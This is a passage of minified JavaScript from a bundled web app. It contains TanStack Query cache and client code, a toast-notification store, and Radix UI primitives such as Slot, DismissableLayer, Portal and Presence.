                isPaused: !1
            };
        case "pending":
            return {
                ...r,
                context: t.context,
                data: void 0,
                failureCount: 0,
                failureReason: null,
                error: null,
                isPaused: t.isPaused,
                status: "pending",
                variables: t.variables,
                submittedAt: Date.now()
            };
        case "success":
            return {
                ...r,
                data: t.data,
                failureCount: 0,
                failureReason: null,
                error: null,
                status: "success",
                isPaused: !1
            };
        case "error":
            return {
                ...r,
                data: void 0,
                error: t.error,
                failureCount: r.failureCount + 1,
                failureReason: t.error,
                isPaused: !1,
                status: "error"
            }
        }
    }
    ;
    this.state = n(this.state),
    gt.batch( () => {
        A(this, xn).forEach(r => {
            r.onMutationUpdate(t)
        }
        ),
        A(this, ht).notify({
            mutation: this,
            type: "updated",
            action: t
        })
    }
    )
}
,
Dm);
function mE() {
    return {
        context: void 0,
        data: void 0,
        error: null,
        failureCount: 0,
        failureReason: null,
        isPaused: !1,
        status: "idle",
        variables: void 0,
        submittedAt: 0
    }
}
var zn, nn, qi, Fm, vE = (Fm = class extends au {
    constructor(t={}) {
        super();
        me(this, zn);
        me(this, nn);
        me(this, qi);
        this.config = t,
        se(this, zn, new Set),
        se(this, nn, new Map),
        se(this, qi, 0)
    }
    build(t, n, r) {
        const o = new hE({
            mutationCache: this,
            mutationId: ++la(this, qi)._,
            options: t.defaultMutationOptions(n),
            state: r
        });
        return this.add(o),
        o
    }
    add(t) {
        A(this, zn).add(t);
        const n = ka(t);
        if (typeof n == "string") {
            const r = A(this, nn).get(n);
            r ? r.push(t) : A(this, nn).set(n, [t])
        }
        this.notify({
            type: "added",
            mutation: t
        })
    }
    remove(t) {
        if (A(this, zn).delete(t)) {
            const n = ka(t);
            if (typeof n == "string") {
                const r = A(this, nn).get(n);
                if (r)
                    if (r.length > 1) {
                        const o = r.indexOf(t);
                        o !== -1 && r.splice(o, 1)
                    } else
                        r[0] === t && A(this, nn).delete(n)
            }
        }
        this.notify({
            type: "removed",
            mutation: t
        })
    }
    canRun(t) {
        const n = ka(t);
        if (typeof n == "string") {
            const r = A(this, nn).get(n)
              , o = r == null ? void 0 : r.find(s => s.state.status === "pending");
            return !o || o === t
        } else
            return !0
    }
    runNext(t) {
        var r;
        const n = ka(t);
        if (typeof n == "string") {
            const o = (r = A(this, nn).get(n)) == null ? void 0 : r.find(s => s !== t && s.state.isPaused);
            return (o == null ? void 0 : o.continue()) ?? Promise.resolve()
        } else
            return Promise.resolve()
    }
    clear() {
        gt.batch( () => {
            A(this, zn).forEach(t => {
                this.notify({
                    type: "removed",
                    mutation: t
                })
            }
            ),
            A(this, zn).clear(),
            A(this, nn).clear()
        }
        )
    }
    getAll() {
        return Array.from(A(this, zn))
    }
    find(t) {
        const n = {
            exact: !0,
            ...t
        };
        return this.getAll().find(r => Lh(n, r))
    }
    findAll(t={}) {
        return this.getAll().filter(n => Lh(t, n))
    }
    notify(t) {
        gt.batch( () => {
            this.listeners.forEach(n => {
                n(t)
            }
            )
        }
        )
    }
    resumePausedMutations() {
        const t = this.getAll().filter(n => n.state.isPaused);
        return gt.batch( () => Promise.all(t.map(n => n.continue().catch(en))))
    }
}
,
zn = new WeakMap,
nn = new WeakMap,
qi = new WeakMap,
Fm);
function ka(e) {
    var t;
    return (t = e.options.scope) == null ? void 0 : t.id
}
function Vh(e) {
    return {
        onFetch: (t, n) => {
            var c, d, p, w, x;
            const r = t.options
              , o = (p = (d = (c = t.fetchOptions) == null ? void 0 : c.meta) == null ? void 0 : d.fetchMore) == null ? void 0 : p.direction
              , s = ((w = t.state.data) == null ? void 0 : w.pages) || []
              , i = ((x = t.state.data) == null ? void 0 : x.pageParams) || [];
            let a = {
                pages: [],
                pageParams: []
            }
              , l = 0;
            const u = async () => {
                let m = !1;
                const S = y => {
                    Object.defineProperty(y, "signal", {
                        enumerable: !0,
                        get: () => (t.signal.aborted ? m = !0 : t.signal.addEventListener("abort", () => {
                            m = !0
                        }
                        ),
                        t.signal)
                    })
                }
                  , v = fy(t.options, t.fetchOptions)
                  , f = async (y, _, b) => {
                    if (m)
                        return Promise.reject();
                    if (_ == null && y.pages.length)
                        return Promise.resolve(y);
                    const T = {
                        client: t.client,
                        queryKey: t.queryKey,
                        pageParam: _,
                        direction: b ? "backward" : "forward",
                        meta: t.options.meta
                    };
                    S(T);
                    const k = await v(T)
                      , {maxPages: P} = t.options
                      , z = b ? oE : rE;
                    return {
                        pages: z(y.pages, k, P),
                        pageParams: z(y.pageParams, _, P)
                    }
                }
                ;
                if (o && s.length) {
                    const y = o === "backward"
                      , _ = y ? gE : zh
                      , b = {
                        pages: s,
                        pageParams: i
                    }
                      , T = _(r, b);
                    a = await f(b, T, y)
                } else {
                    const y = e ?? s.length;
                    do {
                        const _ = l === 0 ? i[0] ?? r.initialPageParam : zh(r, a);
                        if (l > 0 && _ == null)
                            break;
                        a = await f(a, _),
                        l++
                    } while (l < y)
                }
                return a
            }
            ;
            t.options.persister ? t.fetchFn = () => {
                var m, S;
                return (S = (m = t.options).persister) == null ? void 0 : S.call(m, u, {
                    client: t.client,
                    queryKey: t.queryKey,
                    meta: t.options.meta,
                    signal: t.signal
                }, n)
            }
            : t.fetchFn = u
        }
    }
}
function zh(e, {pages: t, pageParams: n}) {
    const r = t.length - 1;
    return t.length > 0 ? e.getNextPageParam(t[r], t, n[r], n) : void 0
}
function gE(e, {pages: t, pageParams: n}) {
    var r;
    return t.length > 0 ? (r = e.getPreviousPageParam) == null ? void 0 : r.call(e, t[0], t, n[0], n) : void 0
}
var Fe, fr, pr, ns, rs, hr, os, ss, Vm, yE = (Vm = class {
    constructor(e={}) {
        me(this, Fe);
        me(this, fr);
        me(this, pr);
        me(this, ns);
        me(this, rs);
        me(this, hr);
        me(this, os);
        me(this, ss);
        se(this, Fe, e.queryCache || new pE),
        se(this, fr, e.mutationCache || new vE),
        se(this, pr, e.defaultOptions || {}),
        se(this, ns, new Map),
        se(this, rs, new Map),
        se(this, hr, 0)
    }
    mount() {
        la(this, hr)._++,
        A(this, hr) === 1 && (se(this, os, py.subscribe(async e => {
            e && (await this.resumePausedMutations(),
            A(this, Fe).onFocus())
        }
        )),
        se(this, ss, El.subscribe(async e => {
            e && (await this.resumePausedMutations(),
            A(this, Fe).onOnline())
        }
        )))
    }
    unmount() {
        var e, t;
        la(this, hr)._--,
        A(this, hr) === 0 && ((e = A(this, os)) == null || e.call(this),
        se(this, os, void 0),
        (t = A(this, ss)) == null || t.call(this),
        se(this, ss, void 0))
    }
    isFetching(e) {
        return A(this, Fe).findAll({
            ...e,
            fetchStatus: "fetching"
        }).length
    }
    isMutating(e) {
        return A(this, fr).findAll({
            ...e,
            status: "pending"
        }).length
    }
    getQueryData(e) {
        var n;
        const t = this.defaultQueryOptions({
            queryKey: e
        });
        return (n = A(this, Fe).get(t.queryHash)) == null ? void 0 : n.state.data
    }
    ensureQueryData(e) {
        const t = this.defaultQueryOptions(e)
          , n = A(this, Fe).build(this, t)
          , r = n.state.data;
        return r === void 0 ? this.fetchQuery(e) : (e.revalidateIfStale && n.isStaleByTime(Mh(t.staleTime, n)) && this.prefetchQuery(t),
        Promise.resolve(r))
    }
    getQueriesData(e) {
        return A(this, Fe).findAll(e).map( ({queryKey: t, state: n}) => {
            const r = n.data;
            return [t, r]
        }
        )
    }
    setQueryData(e, t, n) {
        const r = this.defaultQueryOptions({
            queryKey: e
        })
          , o = A(this, Fe).get(r.queryHash)
          , s = o == null ? void 0 : o.state.data
          , i = Y_(t, s);
        if (i !== void 0)
            return A(this, Fe).build(this, r).setData(i, {
                ...n,
                manual: !0
            })
    }
    setQueriesData(e, t, n) {
        return gt.batch( () => A(this, Fe).findAll(e).map( ({queryKey: r}) => [r, this.setQueryData(r, t, n)]))
    }
    getQueryState(e) {
        var n;
        const t = this.defaultQueryOptions({
            queryKey: e
        });
        return (n = A(this, Fe).get(t.queryHash)) == null ? void 0 : n.state
    }
    removeQueries(e) {
        const t = A(this, Fe);
        gt.batch( () => {
            t.findAll(e).forEach(n => {
                t.remove(n)
            }
            )
        }
        )
    }
    resetQueries(e, t) {
        const n = A(this, Fe)
          , r = {
            type: "active",
            ...e
        };
        return gt.batch( () => (n.findAll(e).forEach(o => {
            o.reset()
        }
        ),
        this.refetchQueries(r, t)))
    }
    cancelQueries(e, t={}) {
        const n = {
            revert: !0,
            ...t
        }
          , r = gt.batch( () => A(this, Fe).findAll(e).map(o => o.cancel(n)));
        return Promise.all(r).then(en).catch(en)
    }
    invalidateQueries(e, t={}) {
        return gt.batch( () => {
            if (A(this, Fe).findAll(e).forEach(r => {
                r.invalidate()
            }
            ),
            (e == null ? void 0 : e.refetchType) === "none")
                return Promise.resolve();
            const n = {
                ...e,
                type: (e == null ? void 0 : e.refetchType) ?? (e == null ? void 0 : e.type) ?? "active"
            };
            return this.refetchQueries(n, t)
        }
        )
    }
    refetchQueries(e, t={}) {
        const n = {
            ...t,
            cancelRefetch: t.cancelRefetch ?? !0
        }
          , r = gt.batch( () => A(this, Fe).findAll(e).filter(o => !o.isDisabled()).map(o => {
            let s = o.fetch(void 0, n);
            return n.throwOnError || (s = s.catch(en)),
            o.state.fetchStatus === "paused" ? Promise.resolve() : s
        }
        ));
        return Promise.all(r).then(en)
    }
    fetchQuery(e) {
        const t = this.defaultQueryOptions(e);
        t.retry === void 0 && (t.retry = !1);
        const n = A(this, Fe).build(this, t);
        return n.isStaleByTime(Mh(t.staleTime, n)) ? n.fetch(t) : Promise.resolve(n.state.data)
    }
    prefetchQuery(e) {
        return this.fetchQuery(e).then(en).catch(en)
    }
    fetchInfiniteQuery(e) {
        return e.behavior = Vh(e.pages),
        this.fetchQuery(e)
    }
    prefetchInfiniteQuery(e) {
        return this.fetchInfiniteQuery(e).then(en).catch(en)
    }
    ensureInfiniteQueryData(e) {
        return e.behavior = Vh(e.pages),
        this.ensureQueryData(e)
    }
    resumePausedMutations() {
        return El.isOnline() ? A(this, fr).resumePausedMutations() : Promise.resolve()
    }
    getQueryCache() {
        return A(this, Fe)
    }
    getMutationCache() {
        return A(this, fr)
    }
    getDefaultOptions() {
        return A(this, pr)
    }
    setDefaultOptions(e) {
        se(this, pr, e)
    }
    setQueryDefaults(e, t) {
        A(this, ns).set(bi(e), {
            queryKey: e,
            defaultOptions: t
        })
    }
    getQueryDefaults(e) {
        const t = [...A(this, ns).values()]
          , n = {};
        return t.forEach(r => {
            Ci(e, r.queryKey) && Object.assign(n, r.defaultOptions)
        }
        ),
        n
    }
    setMutationDefaults(e, t) {
        A(this, rs).set(bi(e), {
            mutationKey: e,
            defaultOptions: t
        })
    }
    getMutationDefaults(e) {
        const t = [...A(this, rs).values()];
        let n = {};
        return t.forEach(r => {
            Ci(e, r.mutationKey) && (n = {
                ...n,
                ...r.defaultOptions
            })
        }
        ),
        n
    }
    defaultQueryOptions(e) {
        if (e._defaulted)
            return e;
        const t = {
            ...A(this, pr).queries,
            ...this.getQueryDefaults(e.queryKey),
            ...e,
            _defaulted: !0
        };
        return t.queryHash || (t.queryHash = If(t.queryKey, t)),
        t.refetchOnReconnect === void 0 && (t.refetchOnReconnect = t.networkMode !== "always"),
        t.throwOnError === void 0 && (t.throwOnError = !!t.suspense),
        !t.networkMode && t.persister && (t.networkMode = "offlineFirst"),
        t.queryFn === Lf && (t.enabled = !1),
        t
    }
    defaultMutationOptions(e) {
        return e != null && e._defaulted ? e : {
            ...A(this, pr).mutations,
            ...(e == null ? void 0 : e.mutationKey) && this.getMutationDefaults(e.mutationKey),
            ...e,
            _defaulted: !0
        }
    }
    clear() {
        A(this, Fe).clear(),
        A(this, fr).clear()
    }
}
,
Fe = new WeakMap,
fr = new WeakMap,
pr = new WeakMap,
ns = new WeakMap,
rs = new WeakMap,
hr = new WeakMap,
os = new WeakMap,
ss = new WeakMap,
Vm), wE = h.createContext(void 0), xE = ({client: e, children: t}) => (h.useEffect( () => (e.mount(),
() => {
    e.unmount()
}
), [e]),
g.jsx(wE.Provider, {
    value: e,
    children: t
}));
async function SE(e) {
    if (!e.ok) {
        const t = await e.text() || e.statusText;
        throw new Error(`${e.status}: ${t}`)
    }
}
const _E = ({on401: e}) => async ({queryKey: t}) => {
    const n = await fetch(t[0], {
        credentials: "include"
    });
    return e === "returnNull" && n.status === 401 ? null : (await SE(n),
    await n.json())
}
  , EE = new yE({
    defaultOptions: {
        queries: {
            queryFn: _E({
                on401: "throw"
            }),
            refetchInterval: !1,
            refetchOnWindowFocus: !1,
            staleTime: 1 / 0,
            retry: !1
        },
        mutations: {
            retry: !1
        }
    }
})
  , bE = 1
  , CE = 1e6;
let nc = 0;
function kE() {
    return nc = (nc + 1) % Number.MAX_SAFE_INTEGER,
    nc.toString()
}
const rc = new Map
  , $h = e => {
    if (rc.has(e))
        return;
    const t = setTimeout( () => {
        rc.delete(e),
        oi({
            type: "REMOVE_TOAST",
            toastId: e
        })
    }
    , CE);
    rc.set(e, t)
}
  , TE = (e, t) => {
    switch (t.type) {
    case "ADD_TOAST":
        return {
            ...e,
            toasts: [t.toast, ...e.toasts].slice(0, bE)
        };
    case "UPDATE_TOAST":
        return {
            ...e,
            toasts: e.toasts.map(n => n.id === t.toast.id ? {
                ...n,
                ...t.toast
            } : n)
        };
    case "DISMISS_TOAST":
        {
            const {toastId: n} = t;
            return n ? $h(n) : e.toasts.forEach(r => {
                $h(r.id)
            }
            ),
            {
                ...e,
                toasts: e.toasts.map(r => r.id === n || n === void 0 ? {
                    ...r,
                    open: !1
                } : r)
            }
        }
    case "REMOVE_TOAST":
        return t.toastId === void 0 ? {
            ...e,
            toasts: []
        } : {
            ...e,
            toasts: e.toasts.filter(n => n.id !== t.toastId)
        }
    }
}
  , Za = [];
let Ka = {
    toasts: []
};
function oi(e) {
    Ka = TE(Ka, e),
    Za.forEach(t => {
        t(Ka)
    }
    )
}
function PE({...e}) {
    const t = kE()
      , n = o => oi({
        type: "UPDATE_TOAST",
        toast: {
            ...o,
            id: t
        }
    })
      , r = () => oi({
        type: "DISMISS_TOAST",
        toastId: t
    });
    return oi({
        type: "ADD_TOAST",
        toast: {
            ...e,
            id: t,
            open: !0,
            onOpenChange: o => {
                o || r()
            }
        }
    }),
    {
        id: t,
        dismiss: r,
        update: n
    }
}
function Df() {
    const [e,t] = h.useState(Ka);
    return h.useEffect( () => (Za.push(t),
    () => {
        const n = Za.indexOf(t);
        n > -1 && Za.splice(n, 1)
    }
    ), [e]),
    {
        ...e,
        toast: PE,
        dismiss: n => oi({
            type: "DISMISS_TOAST",
            toastId: n
        })
    }
}
function fe(e, t, {checkForDefaultPrevented: n=!0}={}) {
    return function(o) {
        if (e == null || e(o),
        n === !1 || !o.defaultPrevented)
            return t == null ? void 0 : t(o)
    }
}
function NE(e, t) {
    typeof e == "function" ? e(t) : e != null && (e.current = t)
}
function yy(...e) {
    return t => e.forEach(n => NE(n, t))
}
function Le(...e) {
    return h.useCallback(yy(...e), e)
}
function RE(e, t=[]) {
    let n = [];
    function r(s, i) {
        const a = h.createContext(i)
          , l = n.length;
        n = [...n, i];
        function u(d) {
            const {scope: p, children: w, ...x} = d
              , m = (p == null ? void 0 : p[e][l]) || a
              , S = h.useMemo( () => x, Object.values(x));
            return g.jsx(m.Provider, {
                value: S,
                children: w
            })
        }
        function c(d, p) {
            const w = (p == null ? void 0 : p[e][l]) || a
              , x = h.useContext(w);
            if (x)
                return x;
            if (i !== void 0)
                return i;
            throw new Error(`\`${d}\` must be used within \`${s}\``)
        }
        return u.displayName = s + "Provider",
        [u, c]
    }
    const o = () => {
        const s = n.map(i => h.createContext(i));
        return function(a) {
            const l = (a == null ? void 0 : a[e]) || s;
            return h.useMemo( () => ({
                [`__scope${e}`]: {
                    ...a,
                    [e]: l
                }
            }), [a, l])
        }
    }
    ;
    return o.scopeName = e,
    [r, AE(o, ...t)]
}
function AE(...e) {
    const t = e[0];
    if (e.length === 1)
        return t;
    const n = () => {
        const r = e.map(o => ({
            useScope: o(),
            scopeName: o.scopeName
        }));
        return function(s) {
            const i = r.reduce( (a, {useScope: l, scopeName: u}) => {
                const d = l(s)[`__scope${u}`];
                return {
                    ...a,
                    ...d
                }
            }
            , {});
            return h.useMemo( () => ({
                [`__scope${t.scopeName}`]: i
            }), [i])
        }
    }
    ;
    return n.scopeName = t.scopeName,
    n
}
var Tr = h.forwardRef( (e, t) => {
    const {children: n, ...r} = e
      , o = h.Children.toArray(n)
      , s = o.find(jE);
    if (s) {
        const i = s.props.children
          , a = o.map(l => l === s ? h.Children.count(i) > 1 ? h.Children.only(null) : h.isValidElement(i) ? i.props.children : null : l);
        return g.jsx(pd, {
            ...r,
            ref: t,
            children: h.isValidElement(i) ? h.cloneElement(i, void 0, a) : null
        })
    }
    return g.jsx(pd, {
        ...r,
        ref: t,
        children: n
    })
}
);
Tr.displayName = "Slot";
var pd = h.forwardRef( (e, t) => {
    const {children: n, ...r} = e;
    if (h.isValidElement(n)) {
        const o = IE(n);
        return h.cloneElement(n, {
            ...ME(r, n.props),
            ref: t ? yy(t, o) : o
        })
    }
    return h.Children.count(n) > 1 ? h.Children.only(null) : null
}
);
pd.displayName = "SlotClone";
var OE = ({children: e}) => g.jsx(g.Fragment, {
    children: e
});
function jE(e) {
    return h.isValidElement(e) && e.type === OE
}
function ME(e, t) {
    const n = {
        ...t
    };
    for (const r in t) {
        const o = e[r]
          , s = t[r];
        /^on[A-Z]/.test(r) ? o && s ? n[r] = (...a) => {
            s(...a),
            o(...a)
        }
        : o && (n[r] = o) : r === "style" ? n[r] = {
            ...o,
            ...s
        } : r === "className" && (n[r] = [o, s].filter(Boolean).join(" "))
    }
    return {
        ...e,
        ...n
    }
}
function IE(e) {
    var r, o;
    let t = (r = Object.getOwnPropertyDescriptor(e.props, "ref")) == null ? void 0 : r.get
      , n = t && "isReactWarning"in t && t.isReactWarning;
    return n ? e.ref : (t = (o = Object.getOwnPropertyDescriptor(e, "ref")) == null ? void 0 : o.get,
    n = t && "isReactWarning"in t && t.isReactWarning,
    n ? e.props.ref : e.props.ref || e.ref)
}
function wy(e) {
    const t = e + "CollectionProvider"
      , [n,r] = RE(t)
      , [o,s] = n(t, {
        collectionRef: {
            current: null
        },
        itemMap: new Map
    })
      , i = w => {
        const {scope: x, children: m} = w
          , S = ie.useRef(null)
          , v = ie.useRef(new Map).current;
        return g.jsx(o, {
            scope: x,
            itemMap: v,
            collectionRef: S,
            children: m
        })
    }
    ;
    i.displayName = t;
    const a = e + "CollectionSlot"
      , l = ie.forwardRef( (w, x) => {
        const {scope: m, children: S} = w
          , v = s(a, m)
          , f = Le(x, v.collectionRef);
        return g.jsx(Tr, {
            ref: f,
            children: S
        })
    }
    );
    l.displayName = a;
    const u = e + "CollectionItemSlot"
      , c = "data-radix-collection-item"
      , d = ie.forwardRef( (w, x) => {
        const {scope: m, children: S, ...v} = w
          , f = ie.useRef(null)
          , y = Le(x, f)
          , _ = s(u, m);
        return ie.useEffect( () => (_.itemMap.set(f, {
            ref: f,
            ...v
        }),
        () => void _.itemMap.delete(f))),
        g.jsx(Tr, {
            [c]: "",
            ref: y,
            children: S
        })
    }
    );
    d.displayName = u;
    function p(w) {
        const x = s(e + "CollectionConsumer", w);
        return ie.useCallback( () => {
            const S = x.collectionRef.current;
            if (!S)
                return [];
            const v = Array.from(S.querySelectorAll(`[${c}]`));
            return Array.from(x.itemMap.values()).sort( (_, b) => v.indexOf(_.ref.current) - v.indexOf(b.ref.current))
        }
        , [x.collectionRef, x.itemMap])
    }
    return [{
        Provider: i,
        Slot: l,
        ItemSlot: d
    }, p, r]
}
function LE(e, t) {
    const n = h.createContext(t)
      , r = s => {
        const {children: i, ...a} = s
          , l = h.useMemo( () => a, Object.values(a));
        return g.jsx(n.Provider, {
            value: l,
            children: i
        })
    }
    ;
    r.displayName = e + "Provider";
    function o(s) {
        const i = h.useContext(n);
        if (i)
            return i;
        if (t !== void 0)
            return t;
        throw new Error(`\`${s}\` must be used within \`${e}\``)
    }
    return [r, o]
}
function Ff(e, t=[]) {
    let n = [];
    function r(s, i) {
        const a = h.createContext(i)
          , l = n.length;
        n = [...n, i];
        const u = d => {
            var v;
            const {scope: p, children: w, ...x} = d
              , m = ((v = p == null ? void 0 : p[e]) == null ? void 0 : v[l]) || a
              , S = h.useMemo( () => x, Object.values(x));
            return g.jsx(m.Provider, {
                value: S,
                children: w
            })
        }
        ;
        u.displayName = s + "Provider";
        function c(d, p) {
            var m;
            const w = ((m = p == null ? void 0 : p[e]) == null ? void 0 : m[l]) || a
              , x = h.useContext(w);
            if (x)
                return x;
            if (i !== void 0)
                return i;
            throw new Error(`\`${d}\` must be used within \`${s}\``)
        }
        return [u, c]
    }
    const o = () => {
        const s = n.map(i => h.createContext(i));
        return function(a) {
            const l = (a == null ? void 0 : a[e]) || s;
            return h.useMemo( () => ({
                [`__scope${e}`]: {
                    ...a,
                    [e]: l
                }
            }), [a, l])
        }
    }
    ;
    return o.scopeName = e,
    [r, DE(o, ...t)]
}
function DE(...e) {
    const t = e[0];
    if (e.length === 1)
        return t;
    const n = () => {
        const r = e.map(o => ({
            useScope: o(),
            scopeName: o.scopeName
        }));
        return function(s) {
            const i = r.reduce( (a, {useScope: l, scopeName: u}) => {
                const d = l(s)[`__scope${u}`];
                return {
                    ...a,
                    ...d
                }
            }
            , {});
            return h.useMemo( () => ({
                [`__scope${t.scopeName}`]: i
            }), [i])
        }
    }
    ;
    return n.scopeName = t.scopeName,
    n
}
var FE = ["a", "button", "div", "form", "h2", "h3", "img", "input", "label", "li", "nav", "ol", "p", "span", "svg", "ul"]
  , ge = FE.reduce( (e, t) => {
    const n = h.forwardRef( (r, o) => {
        const {asChild: s, ...i} = r
          , a = s ? Tr : t;
        return typeof window < "u" && (window[Symbol.for("radix-ui")] = !0),
        g.jsx(a, {
            ...i,
            ref: o
        })
    }
    );
    return n.displayName = `Primitive.${t}`,
    {
        ...e,
        [t]: n
    }
}
, {});
function xy(e, t) {
    e && mo.flushSync( () => e.dispatchEvent(t))
}
function Ft(e) {
    const t = h.useRef(e);
    return h.useEffect( () => {
        t.current = e
    }
    ),
    h.useMemo( () => (...n) => {
        var r;
        return (r = t.current) == null ? void 0 : r.call(t, ...n)
    }
    , [])
}
function VE(e, t=globalThis == null ? void 0 : globalThis.document) {
    const n = Ft(e);
    h.useEffect( () => {
        const r = o => {
            o.key === "Escape" && n(o)
        }
        ;
        return t.addEventListener("keydown", r, {
            capture: !0
        }),
        () => t.removeEventListener("keydown", r, {
            capture: !0
        })
    }
    , [n, t])
}
var zE = "DismissableLayer", hd = "dismissableLayer.update", $E = "dismissableLayer.pointerDownOutside", UE = "dismissableLayer.focusOutside", Uh, Sy = h.createContext({
    layers: new Set,
    layersWithOutsidePointerEventsDisabled: new Set,
    branches: new Set
}), uu = h.forwardRef( (e, t) => {
    const {disableOutsidePointerEvents: n=!1, onEscapeKeyDown: r, onPointerDownOutside: o, onFocusOutside: s, onInteractOutside: i, onDismiss: a, ...l} = e
      , u = h.useContext(Sy)
      , [c,d] = h.useState(null)
      , p = (c == null ? void 0 : c.ownerDocument) ?? (globalThis == null ? void 0 : globalThis.document)
      , [,w] = h.useState({})
      , x = Le(t, k => d(k))
      , m = Array.from(u.layers)
      , [S] = [...u.layersWithOutsidePointerEventsDisabled].slice(-1)
      , v = m.indexOf(S)
      , f = c ? m.indexOf(c) : -1
      , y = u.layersWithOutsidePointerEventsDisabled.size > 0
      , _ = f >= v
      , b = HE(k => {
        const P = k.target
          , z = [...u.branches].some(L => L.contains(P));
        !_ || z || (o == null || o(k),
        i == null || i(k),
        k.defaultPrevented || a == null || a())
    }
    , p)
      , T = WE(k => {
        const P = k.target;
        [...u.branches].some(L => L.contains(P)) || (s == null || s(k),
        i == null || i(k),
        k.defaultPrevented || a == null || a())
    }
    , p);
    return VE(k => {
        f === u.layers.size - 1 && (r == null || r(k),
        !k.defaultPrevented && a && (k.preventDefault(),
        a()))
    }
    , p),
    h.useEffect( () => {
        if (c)
            return n && (u.layersWithOutsidePointerEventsDisabled.size === 0 && (Uh = p.body.style.pointerEvents,
            p.body.style.pointerEvents = "none"),
            u.layersWithOutsidePointerEventsDisabled.add(c)),
            u.layers.add(c),
            Bh(),
            () => {
                n && u.layersWithOutsidePointerEventsDisabled.size === 1 && (p.body.style.pointerEvents = Uh)
            }
    }
    , [c, p, n, u]),
    h.useEffect( () => () => {
        c && (u.layers.delete(c),
        u.layersWithOutsidePointerEventsDisabled.delete(c),
        Bh())
    }
    , [c, u]),
    h.useEffect( () => {
        const k = () => w({});
        return document.addEventListener(hd, k),
        () => document.removeEventListener(hd, k)
    }
    , []),
    g.jsx(ge.div, {
        ...l,
        ref: x,
        style: {
            pointerEvents: y ? _ ? "auto" : "none" : void 0,
            ...e.style
        },
        onFocusCapture: fe(e.onFocusCapture, T.onFocusCapture),
        onBlurCapture: fe(e.onBlurCapture, T.onBlurCapture),
        onPointerDownCapture: fe(e.onPointerDownCapture, b.onPointerDownCapture)
    })
}
);
uu.displayName = zE;
var BE = "DismissableLayerBranch"
  , _y = h.forwardRef( (e, t) => {
    const n = h.useContext(Sy)
      , r = h.useRef(null)
      , o = Le(t, r);
    return h.useEffect( () => {
        const s = r.current;
        if (s)
            return n.branches.add(s),
            () => {
                n.branches.delete(s)
            }
    }
    , [n.branches]),
    g.jsx(ge.div, {
        ...e,
        ref: o
    })
}
);
_y.displayName = BE;
function HE(e, t=globalThis == null ? void 0 : globalThis.document) {
    const n = Ft(e)
      , r = h.useRef(!1)
      , o = h.useRef( () => {}
    );
    return h.useEffect( () => {
        const s = a => {
            if (a.target && !r.current) {
                let l = function() {
                    Ey($E, n, u, {
                        discrete: !0
                    })
                };
                const u = {
                    originalEvent: a
                };
                a.pointerType === "touch" ? (t.removeEventListener("click", o.current),
                o.current = l,
                t.addEventListener("click", o.current, {
                    once: !0
                })) : l()
            } else
                t.removeEventListener("click", o.current);
            r.current = !1
        }
          , i = window.setTimeout( () => {
            t.addEventListener("pointerdown", s)
        }
        , 0);
        return () => {
            window.clearTimeout(i),
            t.removeEventListener("pointerdown", s),
            t.removeEventListener("click", o.current)
        }
    }
    , [t, n]),
    {
        onPointerDownCapture: () => r.current = !0
    }
}
function WE(e, t=globalThis == null ? void 0 : globalThis.document) {
    const n = Ft(e)
      , r = h.useRef(!1);
    return h.useEffect( () => {
        const o = s => {
            s.target && !r.current && Ey(UE, n, {
                originalEvent: s
            }, {
                discrete: !1
            })
        }
        ;
        return t.addEventListener("focusin", o),
        () => t.removeEventListener("focusin", o)
    }
    , [t, n]),
    {
        onFocusCapture: () => r.current = !0,
        onBlurCapture: () => r.current = !1
    }
}
function Bh() {
    const e = new CustomEvent(hd);
    document.dispatchEvent(e)
}
function Ey(e, t, n, {discrete: r}) {
    const o = n.originalEvent.target
      , s = new CustomEvent(e,{
        bubbles: !1,
        cancelable: !0,
        detail: n
    });
    t && o.addEventListener(e, t, {
        once: !0
    }),
    r ? xy(o, s) : o.dispatchEvent(s)
}
var ZE = uu
  , KE = _y
  , ft = globalThis != null && globalThis.document ? h.useLayoutEffect : () => {}
  , QE = "Portal"
  , cu = h.forwardRef( (e, t) => {
    var a;
    const {container: n, ...r} = e
      , [o,s] = h.useState(!1);
    ft( () => s(!0), []);
    const i = n || o && ((a = globalThis == null ? void 0 : globalThis.document) == null ? void 0 : a.body);
    return i ? w_.createPortal(g.jsx(ge.div, {
        ...r,
        ref: t
    }), i) : null
}
);
cu.displayName = QE;
function qE(e, t) {
    return h.useReducer( (n, r) => t[n][r] ?? n, e)
}
var na = e => {
    const {present: t, children: n} = e
      , r = GE(t)
      , o = typeof n == "function" ? n({
        present: r.isPresent
    }) : h.Children.only(n)
      , s = Le(r.ref, YE(o));
    return typeof n == "function" || r.isPresent ? h.cloneElement(o, {
        ref: s
    }) : null
}
;
na.displayName = "Presence";
function GE(e) {
    const [t,n] = h.useState()
      , r = h.useRef({})
      , o = h.useRef(e)
      , s = h.useRef("none")
      , i = e ? "mounted" : "unmounted"
      , [a,l] = qE(i, {
        mounted: {
            UNMOUNT: "unmounted",
            ANIMATION_OUT: "unmountSuspended"
        },
        unmountSuspended: {
            MOUNT: "mounted",
            ANIMATION_END: "unmounted"
        },
        unmounted: {
            MOUNT: "mounted"
        }
    });
    return h.useEffect( () => {
        const u = Ta(r.current);
        s.current = a === "mounted" ? u : "none"
    }
    , [a]),
    ft( () => {
        const u = r.current
          , c = o.current;
        if (c !== e) {
            const p = s.current
              , w = Ta(u);
            e ? l("MOUNT") : w === "none" || (u == null ? void 0 : u.display) === "none" ? l("UNMOUNT") : l(c && p !== w ? "ANIMATION_OUT" : "UNMOUNT"),
            o.current = e
        }
    }
    , [e, l]),
    ft( () => {
        if (t) {
            let u;
            const c = t.ownerDocument.defaultView ?? window
              , d = w => {
                const m = Ta(r.current).includes(w.animationName);
                if (w.target === t && m && (l("ANIMATION_END"),
                !o.current)) {
                    const S = t.style.animationFillMode;
                    t.style.animationFillMode = "forwards",
                    u = c.setTimeout( () => {
                        t.style.animationFillMode === "forwards" && (t.style.animationFillMode = S)
                    }
                    )
                }
            }
              , p = w => {
                w.target === t && (s.current = Ta(r.current))
            }
            ;
            return t.addEventListener("animationstart", p),
            t.addEventListener("animationcancel", d),
            t.addEventListener("animationend", d),
            () => {
                c.clearTimeout(u),
                t.removeEventListener("animationstart", p),
                t.removeEventListener("animationcancel", d),
                t.removeEventListener("animationend", d)
            }
        } else
            l("ANIMATION_END")
    }
    , [t, l]),
    {
        isPresent: ["mounted", "unmountSuspended"].includes(a),
        ref: h.useCallback(u => {
            u && (r.current = getComputedStyle(u)),
            n(u)
        }
        , [])
    }
}
function Ta(e) {
    return (e == null ? void 0 : e.animationName) || "none"
}
function YE(e) {
    var r, o;
